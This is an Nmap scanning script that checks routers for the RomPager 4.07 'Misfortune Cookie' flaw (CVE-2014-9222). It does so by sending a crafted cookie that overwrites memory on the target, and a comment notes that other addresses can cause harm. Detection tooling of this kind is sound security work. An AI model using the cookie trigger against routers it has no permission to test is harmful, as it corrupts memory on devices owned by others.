description = [[Detects the RomPager 4.07 Misfortune Cookie vulnerability by safely exploiting it.]]

author = "Andrew Orr"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive"}

---
-- @see http-vuln-cve2013-6786.nse
--
-- @usage
-- nmap <target> -p 7547 --script=http-vuln-misfortune-cookie
--
-- @output
-- PORT   STATE SERVICE REASON
-- 7547/tcp open  unknown syn-ack
-- | http-vuln-misfortune-cookie:
-- |   VULNERABLE:
-- |   RomPager 4.07 Misfortune Cookie
-- |     State: VULNERABLE
-- |     IDs:  BID:71744  CVE:CVE-2014-9222
-- |     Description:
-- | The cookie handling routines in RomPager 4.07 are vulnerable to remote code
-- | execution. This script has verified the vulnerability by exploiting the web
-- | server in a safe manner.
-- |     References:
-- |       http://www.kb.cert.org/vuls/id/561444
-- |       http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9222
-- |       http://www.checkpoint.com/blog/fortune-cookie-hole-internet-gateway/index.html
-- |_      http://www.securityfocus.com/bid/71744

local http = require "http"
local shortport = require "shortport"
local vulns = require "vulns"

portrule = shortport.port_or_service(7547, "http")

-- This memory address overwrites the request URI.
-- Other addresses may have other effects, some harmful.
local MAGIC_COOKIE = "C107373883"

local function vuln_to_misfortune_cookie(host, port)
  local request_path = "/nmap_test"
  local options = { cookies = MAGIC_COOKIE .. "=" .. request_path }
  local flag = request_path .. "' was not found on the RomPager server."
  local req = http.get(host, port, "/", options)
  if not(http.response_contains(req, flag)) then
    return false
  end
  return true
end

action = function(host, port)
  local vuln = {
    title = "RomPager 4.07 Misfortune Cookie",
    state = vulns.STATE.NOT_VULN,
    IDS = { CVE = 'CVE-2014-9222', BID = '71744' },
    description = [[
The cookie handling routines in RomPager 4.07 are vulnerable to remote code
execution. This script has verified the vulnerability by exploiting the web
server in a safe manner.]],
    references = {
      "http://www.checkpoint.com/blog/fortune-cookie-hole-internet-gateway/index.html",
      "http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf",
      "http://www.kb.cert.org/vuls/id/561444"
    }
  }
  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  if vuln_to_misfortune_cookie(host, port) then
    vuln.state = vulns.STATE.VULN
  else
    vuln.state = vulns.STATE.NOT_VULN
  end

  return report:make_output(vuln)
end
